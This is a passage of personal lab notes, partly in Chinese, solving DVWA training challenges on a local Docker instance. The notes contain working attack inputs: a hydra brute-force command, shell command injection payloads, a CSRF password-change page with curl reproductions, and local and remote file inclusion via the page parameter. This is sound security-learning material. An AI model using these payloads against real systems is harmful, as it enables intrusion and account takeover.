+</p><h3 id="add8f0b1-8ccf-4676-bdd3-b8a197c351e6" class="">memo</h3><pre id="370e7653-2f0f-4862-b5ec-b0e1389e3400" class="code code-wrap"><code>hydra -l admin -P password.lst -s 80 192.168.1.1 http-get /</code></pre><p id="cae4ffe1-9dc6-4b52-a111-6e621c92d483" class="">hydra 的 options 似乎有改變，要留意版本和文件</p><figure id="123d48f5-5eb3-4ee2-bdb1-70a174c98ad6" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%205.png"><img style="width:3030px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%205.png"/></a></figure><p id="2ed6fa2e-ed00-4af1-8fb8-05bf5373fd16" class="">使用 http-form-get module 的話，要用 -s 指定 port, -f 指定 host</p><pre id="01b95d49-2eec-492b-840e-c2d65ba0ff40" class="code code-wrap"><code>:H=Cookie: PHPSESSID=rjevaetqb3dqbj1ph3nmjchel2; security=low</code></pre><p id="acfbe902-1a36-4edd-8eac-73b7a0f07cf8" class="">
+</p><hr id="aa439a91-a97c-4ddd-baaf-f484fe6f1450"/><h1 id="c63e7570-37ec-447a-831a-d93ecb950d4a" class="">2. Command Injection</h1><h3 id="e1dab721-9dbf-4450-84de-9db1183a6704" class="">Objective: Remotely, find out the user of the web service on the OS, as well as the machines hostname via RCE.</h3><p id="3677edd1-cd9e-49b9-8513-bf157288737b" class="">
+</p><p id="026d348e-4a1c-4b51-b107-16ba09072057" class="">security:low 的等級靠運氣猜猜可以中</p><h3 id="a1e9b76e-8682-49f1-8df0-36eb4fcfca56" class="">失敗範例</h3><pre id="5d6802c5-1359-4171-91eb-6cddb7c194ce" class="code code-wrap"><code>1.1.1.1 &amp;&amp; ls</code></pre><pre id="93a997c3-4c30-45e4-acd8-f617b7cdb3e9" class="code code-wrap"><code>1.1.1.1&amp;&amp;ls</code></pre><figure id="66268258-538b-44ee-8e45-b0366fab1714" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%206.png"><img style="width:1554px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%206.png"/></a></figure><p id="44c4caba-d406-4016-98dd-d28e7f154acc" class="">
+</p><h3 id="94e6546f-3072-4126-9f4e-9661a57b8b1f" class="">成功範例</h3><pre id="aa056bd4-038e-4b05-a45f-2da568e9d3c6" class="code code-wrap"><code>1.1.1.1;ls</code></pre><figure id="75eecb4e-cf44-465c-9e9d-7692a75b17cc" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%207.png"><img style="width:1628px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%207.png"/></a></figure><h3 id="6f8c15da-f353-4e89-9075-a3ed010c3901" class="">直接跳過 ping</h3><pre id="eab001e7-d551-4b44-850b-558be9f59ca1" class="code code-wrap"><code>1.1.;ls</code></pre><figure id="f0e67856-d40a-4baf-bdba-38c68815c21e" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%208.png"><img style="width:1332px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%208.png"/></a></figure><p id="3d3ad089-6e28-473a-94be-757a87f1eff0" class="">
+</p><pre id="790bcb4b-bbdc-4fd8-a6e9-1adc6ff1fcd9" class="code code-wrap"><code>;pwd</code></pre><figure id="3999f950-d2ae-4705-887b-438ec0922a27" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%209.png"><img style="width:1308px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%209.png"/></a></figure><p id="f6ca5dee-4f07-4227-9e57-3e1f3a81ce2f" class="">
+</p><h3 id="6b283711-113d-4fb2-a4aa-33f32af9ab72" class="">✨Done✨</h3><pre id="39d5f440-506d-43b1-81c5-26728d9d705e" class="code code-wrap"><code>;ps aux | grep httpd</code></pre><figure id="911ed95d-c406-4a70-8166-4272092a2bc7" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2010.png"><img style="width:2060px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2010.png"/></a></figure><p id="ed15644e-2511-4d03-b6cd-5abec71a3940" class="">web service user is <code>www-data</code></p><p id="d2e22bad-cd40-4c00-a4c5-f3f31eb490a1" class="">
+</p><pre id="f328bb21-4af6-402a-aa12-902622ef631d" class="code code-wrap"><code>;hostname</code></pre><figure id="4a91ad25-a92d-491b-81a8-4573ca72dd4f" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2011.png"><img style="width:1070px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2011.png"/></a></figure><p id="9b85964f-8513-477d-91b1-49218d74238a" class="">
+</p><p id="a2868095-6726-421c-b2d6-70ad3f3cc436" class="">
+</p><p id="980dd580-17ea-4389-8dba-7f86dda422e3" class="">
+</p><hr id="c0daed97-785d-4113-8550-6644b62f717f"/><p id="6c8f19f2-74bd-4e93-8fa4-4e5ffe845310" class="">
+</p><h1 id="9b8d8aa9-5dd5-49db-ad0a-6d3f2eed0c33" class="">3. Cross Site Request Forgery (CSRF)</h1><h3 id="09ea0a95-e3bf-4137-b15a-844b1da7b88f" class="">Objective: Your task is to make the current user change their own password, without them knowing about their actions, using a CSRF attack.</h3><p id="2ee9d686-c56e-4d41-b6f3-f145eb4df799" class="">
+</p><p id="26359c96-39b4-46b7-91c1-fa19e28a4623" class="">參考連結裡面有介紹 GET POSt PUT 等不同場景的攻擊方式</p><figure id="7e29af6f-b357-4c79-80ed-12103b97bd29" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2012.png"><img style="width:1528px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2012.png"/></a></figure><figure id="37299de5-d251-4549-b282-54445a560312" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2013.png"><img style="width:432px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2013.png"/></a></figure><p id="82a3adf2-a0dc-4cf6-a2f6-86e8c83b404a" class="">因為難度是 low，所以這邊練習的重點是引誘別人上鉤，讓目標點擊惡意連結，連結是有讓你更新密碼的 url，所以要模擬一個釣魚的場景，可以做一個有惡意連結頁面或email</p><p id="cbb0a135-8b25-46e7-81b3-b66d2e6068bb" class="">
+</p><h3 id="b5507413-4d34-4bc1-99a8-1f3e835c540d" class="">成立條件至少有兩個:</h3><ol type="1" id="3b4deb0a-581e-47c0-ae49-2b966134c06c" class="numbered-list" start="1"><li>攻擊對象已經登入服務，在不需要重新驗證的情況下，從其他網域或地方也能存取服務</li></ol><ol type="1" id="75eed44a-773f-4c12-8869-92858e1e8389" class="numbered-list" start="2"><li>服務本身有透過連結觸發某些能被你利用功能 (e.g 改密碼, 轉帳)</li></ol><p id="4aa9b7c3-baf5-4a71-8ff0-b933a8d612f7" class="">
+</p><p id="dc86d6bc-34eb-4f48-b6bf-dacb271daf9e" class="">這就是惡意連結，直接在瀏覽器新開分頁貼上執行，會更改密碼</p><pre id="d4f22b84-34f6-4019-b8b2-574be263ab53" class="code code-wrap"><code>GET http://localhost:8086/vulnerabilities/csrf/?password_new=1111&amp;password_conf=1111&amp;Change=Change</code></pre><figure id="a2505d02-6d4e-4fc5-aefe-2a126149e294" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2014.png"><img style="width:3070px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2014.png"/></a></figure><p id="62b43baf-26f8-44c8-9cef-8478191ada1a" class="">
+</p><p id="7546a73a-d326-443d-a1dd-067910f4680c" class="">如果是在沒登入過的狀態，就會跳轉到登入頁面</p><figure id="51c1f0de-1f37-4578-963d-c2fbe6b12daf" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2015.png"><img style="width:1694px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2015.png"/></a></figure><figure id="887e756c-526f-4db0-a664-e58680032d30" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2016.png"><img style="width:432px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2016.png"/></a></figure><h2 id="ccebfd03-719f-4b1a-89b5-6137a0801f5f" class="">GET </h2><h3 id="816c4f88-9fc1-447e-b19c-b123ea757777" class="">by &lt;img /&gt; tag</h3><pre id="ddf44c90-ecaf-430d-a165-4182bb5bcc90" class="code code-wrap"><code>&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;csrf by GET&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+set password to: 1111
+  &lt;img src=&quot;http://localhost:8086/vulnerabilities/csrf/?password_new=1111&amp;password_conf=1111&amp;Change=Change&quot;&gt;
+&lt;/ body&gt;
+&lt;/html&gt;</code></pre><figure id="a99a658c-eacf-4c4a-8934-7c210e0dfa5a" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2017.png"><img style="width:3024px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2017.png"/></a></figure><p id="35c32a51-a1ec-401f-8f26-3fde6f1015b0" class="">test ok</p><div id="30271fe4-1860-4ce9-8770-dc5b08fda8f7" class="column-list"><div id="3c86758b-adb8-4b82-a34a-36a6e051313c" style="width:50%" class="column"><figure id="64cd8fad-67b3-49fa-83fe-46698feefe7d" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2018.png"><img style="width:890px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2018.png"/></a></figure></div><div id="e437ebb9-bb32-42d1-a7fc-508b398d676b" style="width:50%" class="column"><figure id="809b8ec9-6c8c-4c3a-9a04-6ff487b99068" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2019.png"><img style="width:2182px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2019.png"/></a></figure></div></div><h3 id="0219cc99-bbc0-492e-9922-a2b41cc0fd3c" class="">心得</h3><p id="0f2f0913-383f-48a2-8c58-e6f19a9dcbac" class="">現實中可能不容易碰到直接用 GET 跳轉的方式，也要留意不要讓連結執行的過程被呈現出來 XD</p><p id="9425ccce-ade1-4afb-928f-34e68c2c3e8a" class="">因此其他比較低調的方式就值得多實驗看看了</p><h2 id="d9f4e4b1-a7c3-45fc-8b03-d132104476a5" class="">memo</h2><h3 id="06f5c877-12ac-4ea3-97df-32c6ec5dfc08" class="">試著用 curl 模擬 CSRF 的過程</h3><p id="71fe30b5-11c5-40c6-b9ad-d4b9bb2811ba" class="">如果是直接用 cURL 的方式送出 GET 會沒有效果，密碼沒有被更新，看來無法直接偷渡 browser 的 cookie 給 curl XD</p><figure id="73078cd7-347c-41b9-8153-35c770db7b1f" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2020.png"><img style="width:1584px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2020.png"/></a></figure><p id="cf68618c-5f8c-479c-ab63-214a0f406483" class="">
+</p><pre id="653ef752-8b88-4540-9418-1e9ffcbc2542" class="code code-wrap"><code>curl -L &quot;http://localhost:8086/vulnerabilities/csrf/?password_new=111&amp;password_conf=111&amp;Change=Change# -H &#x27;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0&#x27; -H &#x27;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#x27; -H &#x27;Accept-Language: zh-TW,zh;q=0.8,en;q=0.5,en-US;q=0.3&#x27; -H &#x27;Accept-Encoding: gzip, deflate&#x27; -H &#x27;DNT: 1&#x27; -H &#x27;Connection: keep-alive&#x27; -H &#x27;Referer: http://localhost:8086/vulnerabilities/csrf/&#x27; -H &#x27;Cookie: PHPSESSID=f5ndqiqvp4u92i4thpurq2o1k7; security=low&#x27; -H &#x27;Upgrade-Insecure-Requests: 1&#x27; -H &#x27;Sec-Fetch-Dest: document&#x27; -H &#x27;Sec-Fetch-Mode: navigate&#x27; -H &#x27;Sec-Fetch-Site: same-origin&#x27; -H &#x27;Sec-Fetch-User: ?1&quot;</code></pre><h3 id="17a559f9-e305-488d-b70f-ade3e2908590" class="">create and use cookie</h3><p id="3462cf46-8a60-40c2-bf45-8937772cead4" class="">How to use curl with Django, csrf tokens and POST requests - Stack Overflow
+<a href="https://stackoverflow.com/questions/10628275/how-to-use-curl-with-django-csrf-tokens-and-post-requests">https://stackoverflow.com/questions/10628275/how-to-use-curl-with-django-csrf-tokens-and-post-requests</a></p><pre id="f69cde17-685b-4333-9ced-f3187a81afc7" class="code code-wrap"><code>curl -v -c cookies.txt -b cookies.txt host.com/registrations/register/
+curl -v -c cookies.txt -b cookies.txt -d &quot;email=user@site.com&amp;a=1&amp;csrfmiddlewaretoken=&lt;token from cookies.txt&gt;&quot; host.com/registrations/register/</code></pre><p id="b00891aa-df9e-4bb8-90bd-a680602a7c28" class="">
+</p><p id="88684104-3d4a-4a9e-8b86-d988e6581d1d" class="">觀察後確認每一次夠過 curl 取的 PHPSESSID 都不同 (沒指定 cookie 的情況下)</p><pre id="6b185a33-d0c3-433c-adf3-6bfab9beffff" class="code code-wrap"><code>curl -v &quot;http://localhost:8086&quot;</code></pre><div id="5fb16fa3-4561-49d1-8fdc-0946c582181d" class="column-list"><div id="f0af8b47-e9ed-4cad-b89e-b89a221f7a6b" style="width:33.333333333333336%" class="column"><figure id="64fa14ab-5069-4be7-9dbc-a355ee751d4e" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2021.png"><img style="width:623px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2021.png"/></a></figure></div><div id="be530294-2006-4a97-9967-f0abb82fdda6" style="width:33.333333333333336%" class="column"><figure id="44fff1e7-0a77-4838-ad2b-026bf2958fa4" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2022.png"><img style="width:1228px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2022.png"/></a></figure></div><div id="1c033203-2b2d-4ea3-8983-c63a3e6f539b" style="width:33.33333333333333%" class="column"><figure id="6d30a765-2a17-44d0-bdad-a7e634f9e545" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2023.png"><img style="width:1220px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2023.png"/></a></figure></div></div><p id="57dd2991-31b4-4e9e-a3f3-d56f0f33cc35" class="">create and use the specific cookie</p><pre id="0cf6ca3f-8fd3-4e56-904b-020b55584977" class="code code-wrap"><code>curl -v &quot;http://localhost:8086&quot; -c cookies.txt -b cookies.txt</code></pre><figure id="e7a3eaa5-9361-4196-a37e-41b526b18b08" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2024.png"><img style="width:1802px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2024.png"/></a></figure><p id="182580f9-9103-4ce6-a233-f94c1ee581d6" class="">
+</p><h3 id="46910e72-a7a8-4a6c-bb1a-73a292e724b1" class="">模擬登入取得 cookie</h3><h3 id="2dbdc3e2-bd35-4963-8102-e03e070ce3ff" class="">處理 user_token</h3><p id="99cd580d-3242-434f-8ab8-057ca3ac36b3" class="">登入頁面有 user_token，必須帶入 request 才能登入</p><pre id="c6d66153-c6bc-4220-bfa1-5ea4628fb1dd" class="code code-wrap"><code>curl -L http://localhost:8086</code></pre><figure id="d1df2928-95bd-4ca7-af23-1cc88d3dcc4b" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2025.png"><img style="width:1752px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2025.png"/></a></figure><pre id="6ec8740f-8053-4c25-a751-57549035aedf" class="code code-wrap"><code>curl -v -L -c cookies.txt -b cookies.txt -X POST &quot;http://localhost:8086/login.php&quot; --data-raw &#x27;username=admin&amp;password=123&amp;Login=Login&amp;user_token=bc27fbf9cc617adb1c1b3f44f9fd1b62&#x27;</code></pre><p id="501afbac-e67c-4b45-8589-5144cc5a6a6b" class="">
+</p><p id="98ec61b6-18c5-477e-bf88-68e77ccfbfc0" class="">登入成功</p><figure id="11235858-4ee5-4ce7-aa73-f041db63ab67" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2026.png"><img style="width:1094px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2026.png"/></a></figure><p id="1184cea6-6974-46a9-ac62-964f209ae011" class="">
+</p><p id="40a58fb5-ba95-4536-b412-c4d8b34c4582" class="">接下來就可以利用取得的 cookie 來模擬更改密碼的行為，將密碼改成 111</p><pre id="b7167e34-5eee-4f7f-a8ec-f446f93e543d" class="code code-wrap"><code>curl -v -c cookies.txt -b cookies.txt &quot;http://localhost:8086/vulnerabilities/csrf/?password_new=111&amp;password_conf=111&amp;Change=Change#&quot;</code></pre><figure id="daa5e267-14c9-414d-a5cf-f8d4761ae033" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2027.png"><img style="width:3032px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2027.png"/></a></figure><p id="031180b2-dc5d-463b-8055-3f8d0df5b66f" class="">
+</p><p id="b2e2dd61-0cf8-407b-b601-2b1180cf02e5" class="">測試 ok</p><div id="18994d26-5804-41bc-a843-e06705bb5788" class="column-list"><div id="93c00619-1cdc-47a2-ae54-e570a24b11f9" style="width:37.5%" class="column"><figure id="a7c16161-465a-4d66-9ac6-0af658a3a318" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2028.png"><img style="width:1000px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2028.png"/></a></figure></div><div id="e0411d96-f8e5-419d-bd7e-4a5fb34df4b0" style="width:62.5%" class="column"><figure id="a8e77d58-8527-45e7-b550-1b693e3f9794" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2029.png"><img style="width:2186px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2029.png"/></a></figure></div></div><hr id="4c7805ef-60b1-4457-bfad-a894d9cb32a3"/><h1 id="b292b0d2-febc-4f76-8923-f3cadca8d942" class="">4. File Inclusion</h1><h3 id="2b41a8dd-389a-406a-8f0d-141f08db06ea" class="">Objective: Read all <span style="border-bottom:0.05em solid">five</span> famous quotes from &#x27;<a href="http://localhost:8086/hackable/flags/fi.php">../hackable/flags/fi.php</a>&#x27; using only the file inclusion.</h3><p id="6d2f931f-b59d-47a6-92d0-77caa2c6f2d6" class="">
+</p><p id="3853154e-2f5d-4be5-9303-1fa650f6f3d2" class="">如果網站有讀取檔案相關的功能，你又能夠利用這個特性來操控被讀取的檔案的話，就有機會發現這類檔案讀取相關的弱點，嚴重的情況可能造成 RCE</p><h2 id="929ef182-0aab-4e98-8ded-1f0a06359ab0" class="">觀察</h2><p id="ad28d45d-4699-4fc4-a0ac-88e224d48932" class="">從 URL 可以很直覺的發現有地方可以 try</p><pre id="7b2de586-3bdd-4c8c-bc34-2e2bd5ed50d3" class="code code-wrap"><code>http://localhost:8086/vulnerabilities/fi/?page=file1.php</code></pre><figure id="bf09f28e-f641-485b-8d16-c791d29aaf92" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2030.png"><img style="width:874px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2030.png"/></a></figure><p id="91088f9f-f950-4233-b832-e540bcfdc038" class="">
+</p><h2 id="fb1572b1-23c7-41cf-8b8a-8e59a2267cc7" class="">測試 URL parameters</h2><p id="be938997-4b3b-4eb4-8ff0-121c6b8fddd1" class="">看到連續的數字就會很自然的想加上去</p><pre id="d8d322fa-04cf-4ff0-a818-da933a0438be" class="code code-wrap"><code>http://localhost:8086/vulnerabilities/fi/?page=file4.php</code></pre><p id="06383347-b7cc-4193-a836-458db53a3524" class="">發現了一個隱藏檔案 File 4</p><figure id="5346d5f9-7dd3-4553-84ba-60250d1519b6" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2031.png"><img style="width:1618px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2031.png"/></a></figure><p id="a97f8487-f5d2-4e9a-85d7-27e32f4668d4" class="">接下來不知道要幹嘛，只好看一下提示</p><h3 id="a618ad05-5472-43f0-b787-3f3edc39367b" class="">查看提示中的連結</h3><p id="45201c8d-d885-4d79-bf0d-0549a43dc074" class="">我們讀取 <code>../hackable/flags/fi.php</code> 中的內容</p><figure id="a7c3e416-5d6f-4040-81ea-1d4113232aee" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2032.png"><img style="width:1336px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2032.png"/></a></figure><pre id="e4276f88-e40d-479d-bccb-7e5f38c97cc4" class="code code-wrap"><code>../hackable/flags/fi.php&#x27;</code></pre><p id="6a25a1fc-7c55-4f3a-808d-4464435452bd" class="">
+</p><p id="587212a7-cdfe-4870-b7b6-7c9a742424ca" class="">可以看出這個檔案的位置在:</p><pre id="1f88f015-9ad5-44c6-bbfd-0f0ac2b0cb11" class="code code-wrap"><code>http://localhost:8086/hackable/flags/fi.php</code></pre><p id="1fb21392-9d6c-40d9-a507-a2bc2f0db854" class="">
+</p><p id="24c1f732-4854-4592-906a-628c4df598ca" class="">可以點進去到處看看</p><figure id="0025ccf0-e0f1-4f20-a902-f9c635abf295" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2033.png"><img style="width:480px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2033.png"/></a></figure><p id="2f8c479c-7232-451c-ac1f-6c203478908d" class="">直接點 fi.php，它叫我們用 file include 的方式執行它</p><figure id="f765653a-ee17-4eb7-aa31-aa90f1f0b604" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2034.png"><img style="width:1050px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2034.png"/></a></figure><p id="41613900-b559-473b-9344-c47b7705939a" class="">
+</p><p id="578d97be-e692-43bf-9264-918dee6bcd64" class="">上層也有其他檔案</p><pre id="97a46615-ee83-4afe-a1f2-4024c68d713b" class="code code-wrap"><code>http://localhost:8086/hackable/flags/</code></pre><figure id="12c37be7-48a4-46eb-9db2-532ad587d312" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2035.png"><img style="width:528px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2035.png"/></a></figure><p id="ab2b75bf-67c8-4283-9ee1-6824fce500eb" class="">
+</p><p id="1991c905-6ec5-4768-bafb-ed81831479c5" class="">
+</p><p id="e99c58e3-8568-4037-99e0-d85826f522ac" class="">回到題目，如果從 <code><a href="http://localhost:8086/vulnerabilities/fi/">http://localhost:8086/vulnerabilities/fi/</a></code> 要 include 該檔案的話，那就要往前推兩層，也就是 <code>../../hackable/flags/fi.php</code></p><pre id="5279460a-aa4b-425f-a1c7-1cb0827f6bb0" class="code code-wrap"><code>localhost:8086/vulnerabilities/fi/?page=../../hackable/flags/fi.php</code></pre><figure id="8583f8a6-2b2b-4849-819a-7486e2c62897" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2036.png"><img style="width:1698px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2036.png"/></a></figure><p id="42f7b287-95c8-4629-b185-0a2f34f8ba61" class="">
+</p><p id="6ae60a02-c973-4e67-8c61-892c3233053f" class="">頁面只出現 3 個答案，有 2 個被隱藏起來了</p><pre id="f285b1fd-29e1-4c09-9f60-e5092a668351" class="code code-wrap"><code>1.) Bond. James Bond 2.) My name is Sherlock Holmes. It is my business to know what other people don&#x27;t know.
+
+--LINE HIDDEN ;)--
+
+4.) The pool on the roof must have a leak.</code></pre><p id="e6411f0a-c5ac-487c-a777-7da7e0f9a8ba" class="">
+</p><p id="55e31cc2-1231-468d-a299-8e2490157a46" class="">不知道它們藏在哪，只好看一下 source，第 5 個就藏在裡面</p><pre id="a0d28850-be3e-40b5-b314-0fda1ccef1ad" class="code code-wrap"><code>5.) The world isn&#x27;t run by weapons anymore, or energy, or money. It&#x27;s run by little ones and zeroes, little bits of data. It&#x27;s all just electrons.</code></pre><figure id="c352eb51-9628-4418-b388-3a97da794af7" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2037.png"><img style="width:2246px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2037.png"/></a></figure><p id="5684f22d-be67-4073-9379-0a778c56ddf7" class="">QQ 還有一個 --LINE HIDDEN ;)— 不知道藏在哪，仔細檢查或搜尋好幾次都沒發現</p><p id="1a3cf9c1-3024-48cd-8f43-7207cb1dd307" class="">
+</p><h3 id="5910e587-7fdb-4cfa-91f6-9f3ac6331fb6" class="">試著從其他地方存取檔案</h3><p id="43621ffd-3654-4a3c-80cc-b6eb77d0b1bd" class="">走投無路之下只好從 command injection 偷看資料夾內容</p><pre id="eb856d7a-0348-4fd0-aa54-d0d9f90e6af5" class="code code-wrap"><code>;ls /var/www/html/vulnerabilities/fi</code></pre><figure id="a3e64361-1ea4-4bd8-b5b6-8fcb6d676b2d" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2038.png"><img style="width:1978px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2038.png"/></a></figure><p id="b53ab2f4-209c-432d-83de-26eaef0266ae" class="">
+</p><p id="2060538e-996f-4043-ae10-5d047f442c61" class="">不過我要觀察的是 <code>fi.php</code> ，因為秘密就藏在裡面</p><pre id="ccac9c8e-ac60-463d-be47-04eb61300c83" class="code code-wrap"><code>;cat /var/www/html/hackable/flags/fi.php</code></pre><figure id="1b02c57c-c7f6-4633-a3c3-1c065360a5f2" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2039.png"><img style="width:2602px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2039.png"/></a></figure><pre id="4d5e2f08-910c-4f74-9be0-77e72aab8836" class="code code-wrap"><code>1.) Bond. James Bond
+
+
+\n&quot;;
+
+$line3 = &quot;3.) Romeo, Romeo! Wherefore art thou Romeo?&quot;;
+$line3 = &quot;--LINE HIDDEN ;)--&quot;;
+echo $line3 . &quot;\n\n
+
+\n&quot;;
+
+$line4 = &quot;NC4pI&quot; . &quot;FRoZSBwb29s&quot; . &quot;IG9uIH&quot; . &quot;RoZSByb29mIG1&quot; . &quot;1c3QgaGF&quot; . &quot;2ZSBh&quot; . &quot;IGxlY&quot; . &quot;Wsu&quot;;
+echo base64_decode( $line4 );
+
+?&gt;</code></pre><p id="4613f99f-d644-438a-8bd9-d3b46f828a42" class="">可以得到第 3 個答案</p><pre id="a6360f3f-0ad9-4d00-abc2-e59b514ddf9c" class="code code-wrap"><code>&quot;3.) Romeo, Romeo! Wherefore art thou Romeo?&quot;;</code></pre><p id="33f3b5c1-0e17-4c79-b643-c6b27c146c9e" class="">第4個答案之前已經找到了，從這邊用 base64 decode $line4 也可以得到相同的結果</p><pre id="5383c780-5c93-41f1-a282-27dd60194ad3" class="code code-wrap"><code>NC4pIFRoZSBwb29sIG9uIHRoZSByb29mIG11c3QgaGF2ZSBhIGxlYWsu
+4.) The pool on the roof must have a leak.</code></pre><p id="c15818f0-79a8-450d-84e6-f3c7ff80ad44" class="">
+</p><h3 id="e6c017f6-57a6-4ba3-8319-575c0bcd9eb6" class="">✨Done✨</h3><pre id="9a7baa0b-bb14-4e6d-bd63-6096b39c831a" class="code code-wrap"><code>1.) Bond. James Bond
+
+2.) My name is Sherlock Holmes. It is my business to know what other people don&#x27;t know.
+
+3.) Romeo, Romeo! Wherefore art thou Romeo?
+
+4.) The pool on the roof must have a leak.
+
+5.) The world isn&#x27;t run by weapons anymore, or energy, or money. It&#x27;s run by little ones and zeroes, little bits of data. It&#x27;s all just electrons.</code></pre><h2 id="be508e82-4c01-49ef-b20f-e3e9bf2195c8" class="">memo</h2><h3 id="1caa8cbb-40cd-44cd-b45d-225c591ddb7f" class="">測試載入遠端檔案</h3><h3 id="48b56c59-1b05-4aae-a93a-223248d25b67" class="">準備一個要被遠端載入的檔案</h3><pre id="9f4615bd-e330-4a76-9062-a0a713004057" class="code code-wrap"><code>echo &#x27;&lt;? echo &quot;yo&quot; ?&gt;&#x27; &gt; yo.php</code></pre><p id="8e825e61-d63f-4587-85cd-908d00ae871f" class="">用 http-server 在 Host machine 建立測試用的 server，這是要給 DVWA container 戳的</p><figure id="7d009366-71d5-4bb4-8503-127d055d390a" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2040.png"><img style="width:1858px" src="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2040.png"/></a></figure><pre id="6fdae0b7-c3bc-4a11-8c4a-33a4f412a4e1" class="code code-wrap"><code>http://localhost:8086/vulnerabilities/fi/?page=http://192.168.0.196:8080/yo.php</code></pre><p id="9fb5988b-4539-41a8-ae2d-99a6c3306f7a" class="">or</p><pre id="76b396f5-e192-460e-bc99-e0f30d0a0edc" class="code code-wrap"><code>http://localhost:8086/vulnerabilities/fi/?page=http://host.docker.internal:8080/yo.php</code></pre><p id="01e7b48f-ea2f-4303-91be-e7816587e2e4" class="">可以看到左上角顯示了 yo，代表有成功執行檔案</p><figure id="15c83b4f-c41a-422e-96d9-5f076bd17256" class="image"><a href="DVWA%2018a0425eb14f4c03822e8c563383e612/Untitled%2041.png"><img style="width:1173px" 